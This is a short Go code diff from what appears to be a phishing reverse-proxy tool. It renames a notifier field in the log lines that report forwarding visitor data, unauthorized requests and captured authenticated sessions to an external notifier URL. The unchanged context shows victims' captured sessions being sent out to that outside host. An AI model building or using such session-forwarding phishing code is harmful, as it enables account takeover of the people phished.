@@ -265,7 +265,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									for _, n := range p.cfg.notifiers {
 										if n.OnEvent == "visitor" && n.Enabled {
 											session, _ := p.db.GetSessionBySid(session.Id)
-											log.Info("[%d] [%s] forwarding visitor info to notifier url %s", sid, hiblue.Sprint(pl_name), n.Url)
+											log.Info("[%d] [%s] forwarding visitor info to notifier url %s", sid, hiblue.Sprint(pl_name), n.Target)
 											err := NotifyOnVisitor(n, *session, req.URL)
 											if err != nil {
 												log.Error("notifier: %v", err)
@@ -287,7 +287,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 								for _, n := range p.cfg.notifiers {
 									if n.OnEvent == "unauthorized" && n.Enabled {
-										log.Info("[%s] forwarding unauthorized request to notifier url %s", hiblue.Sprint(pl_name), n.Url)
+										log.Info("[%s] forwarding unauthorized request to notifier url %s", hiblue.Sprint(pl_name), n.Target)
 										err := NotifyOnUnauthorized(n, pl_name, req_url, req.Header.Get("User-Agent"), remote_addr)
 										if err != nil {
 											log.Error("notifier: %v", err)
@@ -727,7 +727,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									for _, n := range p.cfg.notifiers {
 										if n.OnEvent == "authenticated" && n.Enabled {
 											session, _ := p.db.GetSessionBySid(ps.SessionId)
-											log.Info("[%d] forwarding captured session to notifier url %s", ps.Index, n.Url)
+											log.Info("[%d] forwarding captured session to notifier url %s", ps.Index, n.Target)
 											err := NotifyOnAuth(n, *session, pl)
 											if err != nil {
 												log.Error("notifier: %v", err)
@@ -877,7 +877,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								for _, n := range p.cfg.notifiers {
 									if n.OnEvent == "authenticated" && n.Enabled {
 										session, _ := p.db.GetSessionBySid(ps.SessionId)
-										log.Info("[%d] forwarding captured session to notifier url %s", ps.Index, n.Url)
+										log.Info("[%d] forwarding captured session to notifier url %s", ps.Index, n.Target)
 										err := NotifyOnAuth(n, *session, pl)
 										if err != nil {
 											log.Error("notifier: %v", err)
